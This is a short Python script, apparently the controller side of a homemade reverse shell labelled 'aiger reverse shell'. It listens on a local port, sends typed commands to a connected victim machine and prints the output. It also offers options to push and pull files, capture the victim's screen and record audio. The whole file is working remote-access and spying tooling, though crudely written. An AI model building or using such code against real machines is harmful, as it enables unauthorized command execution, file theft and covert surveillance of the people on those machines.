
from socket import *
import os
import pyautogui
# import pyfiglet

# ascii_banner = pyfiglet.figlet_format('''aiger reverse shell''')
# print(ascii_banner)
host="127.0.0.1"
port=1234
s = socket() 
s.bind((host,port))

s.listen(5)
c,addr = s.accept()

while True:
        cmd=input("~>")
        if cmd=="break":
            c.send(str.encode(cmd))
            break
        c.send(str.encode(cmd))
        result1=str(c.recv(4096),"utf-8")
        print(result1)
        # cmd=input("~>")



def file_upload():
    filename=input("enter filename")
    c.send(str.encode(filename))
    file=open(filename,"rb")
    image_data=file.read(2048)
    while image_data:
            c.send(image_data)
            image_data=file.read(2048)
            

def file_download():
            fielanme=input("Enter file name")
            c.send(str.encode(fielanme))
            file=open(fielanme+"5","wb")
            image_chunk=c.recv(2048)
            while image_chunk:
                file.write(image_chunk)
                image_chunk=c.recv(2048)
            file.close()

        





userInput=input("1.upload_file\n2.file_download\n3.screenshort\n4vocierecode")
if userInput=="1":
    c.send(userInput.encode("UTF-8"))
    file_upload()
elif userInput=="2":
    c.send(userInput.encode("UTF-8"))
    file_download()
elif userInput=="3":
    c.send(userInput.encode("UTF-8"))
    file=open("screenshort2o.png","wb")
    image_chunk=c.recv(2048)
    while image_chunk:
        file.write(image_chunk)
        image_chunk=c.recv(2048)
    file.close()


elif userInput=="4":
    c.send(userInput.encode("UTF-8"))
    with open('outputrecord.wav','wb') as f:
        while True:
            l = c.recv(1024)
            if not l: break
            f.write(l)
        s.close()

